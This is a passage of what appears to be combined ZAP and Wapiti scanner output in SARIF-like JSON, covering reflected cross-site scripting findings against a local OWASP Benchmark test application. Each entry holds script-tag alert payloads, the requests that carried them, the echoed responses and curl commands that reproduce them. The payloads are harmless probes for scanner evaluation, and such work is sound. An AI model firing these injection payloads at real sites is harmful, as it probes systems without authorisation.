            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01597', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01597.html?BenchmarkTest01597=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDE1OTc9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01597', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01597.html?BenchmarkTest01597=SafeText', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01597=%3CScRiPt%3Ealert%28%27wp6gcxfxj5%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '36', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:59 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '46', 'date': 'Sun, 31 Aug 2025 04:25:40 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wp6gcxfxj5')</sCrIpT>_SafeStuff\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01598",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01598?secure=default&productID=default&foo=foo&BenchmarkTest01598=%3CScRiPt%3Ealert%28%27wxwrrae0eu%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wxwrrae0eu')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wxwrrae0eu')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01598\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01598.html?BenchmarkTest01598=SafeText\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest01598=%3CScRiPt%3Ealert%28%27wxwrrae0eu%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01598"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01598', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '94', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01598.html?BenchmarkTest01598=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAxNTk4PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01598', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-03/BenchmarkTest01598.html?BenchmarkTest01598=SafeText', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest01598=%3CScRiPt%3Ealert%28%27wxwrrae0eu%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:59 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:25:40 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wxwrrae0eu')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02126",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02126?BenchmarkTest02126=SafeText&BenchmarkTest02126=Movies&BenchmarkTest02126=Writing&BenchmarkTest02126=%3CScRiPt%3Ealert%28%27wk0q43s335%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wk0q43s335')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wk0q43s335')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02126\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02126.html\" -d \"BenchmarkTest02126=SafeText&BenchmarkTest02126=Movies&BenchmarkTest02126=Writing&BenchmarkTest02126=%3CScRiPt%3Ealert%28%27wk0q43s335%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02126"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02126', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02126.html?BenchmarkTest02126=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAyMTI2PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02126', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02126.html', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest02126=SafeText&BenchmarkTest02126=Movies&BenchmarkTest02126=Writing&BenchmarkTest02126=%3CScRiPt%3Ealert%28%27wk0q43s335%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:00 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:25:52 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wk0q43s335')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02127",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02127?BenchmarkTest02127=%3CScRiPt%3Ealert%28%27w5myjaiknm%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w5myjaiknm')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w5myjaiknm')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02127\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02127.html\" -d \"BenchmarkTest02127=%3CScRiPt%3Ealert%28%27w5myjaiknm%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02127"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02127', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '61', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02127.html?BenchmarkTest02127=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAyMTI3PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02127', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02127.html', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest02127=%3CScRiPt%3Ealert%28%27w5myjaiknm%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:00 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:25:52 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w5myjaiknm')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02129",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02129?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02129=%3CScRiPt%3Ealert%28%27wdn7juewxy%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wdn7juewxy')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wdn7juewxy')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02129\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02129.html?BenchmarkTest02129=SafeText\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02129=%3CScRiPt%3Ealert%28%27wdn7juewxy%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02129"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02129', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02129.html?BenchmarkTest02129=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDIxMjk9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02129', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02129.html?BenchmarkTest02129=SafeText', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02129=%3CScRiPt%3Ealert%28%27wdn7juewxy%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:00 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: a and <scrIpt>alert(1);</scRipt>.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:25:52 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: a and <ScRiPt>alert('wdn7juewxy')</sCrIpT>.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02130",
